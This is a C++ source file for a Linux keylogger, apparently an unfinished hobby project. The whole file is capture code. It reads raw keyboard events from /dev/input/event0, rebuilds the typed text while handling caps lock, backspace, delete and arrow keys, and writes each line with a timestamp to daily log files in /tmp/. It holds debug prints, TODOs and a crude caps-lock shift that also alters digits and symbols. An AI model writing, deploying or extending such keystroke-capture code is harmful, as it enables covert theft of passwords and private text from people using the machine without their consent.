#include <chrono>
#include <ctime>
#include <fstream>
#include <iostream>
#include <map>
#include <string>
#include <vector>

#include <linux/input.h>

#define LOGS_DIRECTORY  "/tmp/"

struct keylogger_ctx {
    bool is_capslock_on;
    std::string kb_file;
    std::vector<char> kb_buffer;
    int buffer_cursor;
    char current_key;
};

struct key_event_handler {
    char key_char;
    void (*cb)(struct keylogger_ctx *);
};

void handle_key(struct keylogger_ctx *);
void handle_enter(struct keylogger_ctx *);
void handle_backspace(struct keylogger_ctx *);
void handle_capslock(struct keylogger_ctx *);
void handle_delete(struct keylogger_ctx *);
void handle_arrow(struct keylogger_ctx *);

static const std::map<int, struct key_event_handler> handlers{
    { KEY_0, { '0', handle_key } },
    { KEY_1, { '1', handle_key } },
    { KEY_2, { '2', handle_key } },
    { KEY_3, { '3', handle_key } },
    { KEY_4, { '4', handle_key } },
    { KEY_5, { '5', handle_key } },
    { KEY_6, { '6', handle_key } },
    { KEY_7, { '7', handle_key } },
    { KEY_8, { '8', handle_key } },
    { KEY_9, { '9', handle_key } },
    { KEY_A, { 'a', handle_key } },
    { KEY_B, { 'b', handle_key } },
    { KEY_C, { 'c', handle_key } },
    { KEY_D, { 'd', handle_key } },
    { KEY_E, { 'e', handle_key } },
    { KEY_F, { 'f', handle_key } },
    { KEY_G, { 'g', handle_key } },
    { KEY_H, { 'h', handle_key } },
    { KEY_I, { 'i', handle_key } },
    { KEY_J, { 'j', handle_key } },
    { KEY_K, { 'k', handle_key } },
    { KEY_L, { 'l', handle_key } },
    { KEY_M, { 'm', handle_key } },
    { KEY_N, { 'n', handle_key } },
    { KEY_O, { 'o', handle_key } },
    { KEY_P, { 'p', handle_key } },
    { KEY_Q, { 'q', handle_key } },
    { KEY_R, { 'r', handle_key } },
    { KEY_S, { 's', handle_key } },
    { KEY_T, { 't', handle_key } },
    { KEY_U, { 'u', handle_key } },
    { KEY_V, { 'v', handle_key } },
    { KEY_W, { 'w', handle_key } },
    { KEY_X, { 'x', handle_key } },
    { KEY_Y, { 'y', handle_key } },
    { KEY_Z, { 'z', handle_key } },
    { KEY_COMMA, { ',', handle_key } },
    { KEY_DOT, { '.', handle_key } },
    { KEY_MINUS, { '-', handle_key } },
    { KEY_SEMICOLON, { ';', handle_key } },
    { KEY_EQUAL, { '=', handle_key } },
    { KEY_SPACE, { ' ', handle_key } },
    { KEY_ENTER, { '\0', handle_enter } },
    { KEY_BACKSPACE, { '\0', handle_backspace } },
    { KEY_CAPSLOCK, { '\0', handle_capslock } },
    { KEY_DELETE, { '\0', handle_delete } },
    { KEY_RIGHT, { '\0', handle_arrow } },
    { KEY_LEFT, { '\0', handle_arrow } }
};

void handle_key(struct keylogger_ctx *ctx)
{
    auto key_char = handlers.at(ctx->current_key).key_char;

    // TODO: improve
    if (ctx->is_capslock_on) {
        key_char -= 32;
    }

    ctx->kb_buffer.emplace_back(key_char);
    ctx->buffer_cursor++;

    std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
}

void handle_enter(struct keylogger_ctx *ctx)
{
    char date[11] = {0}, timestamp[9] = {0};

    {
        auto now = std::chrono::system_clock::to_time_t(
            std::chrono::system_clock::now()
        );

        std::strftime(
            date,
            sizeof(date),
            "%d_%m_%Y",
            std::localtime(&now)
        );
        std::strftime(
            timestamp,
            sizeof(timestamp),
            "%H:%M:%S",
            std::localtime(&now)
        );
    }

    std::ofstream log_file{
        std::string{LOGS_DIRECTORY} + "log_" + date, std::ios::app
    };

    log_file << "[" << timestamp << "] ";
    log_file.write(ctx->kb_buffer.data(), ctx->kb_buffer.size());
    log_file << "\n";

    ctx->kb_buffer.clear();
    ctx->buffer_cursor = 0;
    std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
}

void handle_capslock(struct keylogger_ctx *ctx)
{
    ctx->is_capslock_on = !ctx->is_capslock_on;
    std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
}

void handle_delete(struct keylogger_ctx *ctx)
{
    std::cout << "cursor " << ctx->buffer_cursor << std::endl;
    std::cout << "size " << ctx->kb_buffer.size() << std::endl;
    if (ctx->buffer_cursor < ctx->kb_buffer.size()) {
        ctx->kb_buffer.erase(ctx->kb_buffer.begin() + ctx->buffer_cursor);
    }

    std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
}

void handle_backspace(struct keylogger_ctx *ctx)
{
    if (!ctx->kb_buffer.empty()) {
        ctx->kb_buffer.erase(
            ctx->kb_buffer.begin() + (--ctx->buffer_cursor)
        );
    }

    std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
}

void handle_arrow(struct keylogger_ctx *ctx)
{
    ctx->buffer_cursor = (ctx->current_key == KEY_LEFT)
        ? (ctx->buffer_cursor - 1)
        : (ctx->buffer_cursor + 1);
    std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
}

int main(int argc, char *argv[])
{
    struct input_event ev;
    struct keylogger_ctx ctx = {
        .is_capslock_on = false,
        .kb_file = "/dev/input/event0", // TODO: is this correct?
        .buffer_cursor = 0
    };

    {
        std::ifstream kb_file{ctx.kb_file};

        while (1) {
            kb_file.read((char *)&ev, sizeof(struct input_event));

            // TODO: delete
            // TODO: tab
            // TODO: capslock
            if (ev.type == EV_KEY && ev.value) {
                try {
                    auto ev_handler = handlers.at(ev.code);

                    ctx.current_key = ev.code;
                    ev_handler.cb(&ctx);
                } catch (...) {
                    std::cout << "no event handler for key " << ev.code
                        << std::endl;
                }
            }
        }
    }

    std::exit(EXIT_SUCCESS);
}
